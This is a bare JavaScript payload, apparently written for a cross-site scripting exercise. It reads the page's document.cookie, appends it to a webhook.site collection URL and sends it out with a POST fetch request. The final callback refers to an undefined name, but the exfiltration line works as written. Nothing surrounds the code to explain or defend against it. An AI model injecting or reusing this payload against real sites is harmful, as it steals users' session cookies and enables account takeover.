var target_evil = "https://webhook.site/112c575b-0be9-4051-8cec-11815c6940e7?"+document.cookie

fetch(target_evil, 
  {
    method: "POST",
    headers: {"Content-Type": "application/json"},
  }
).then(res => asd);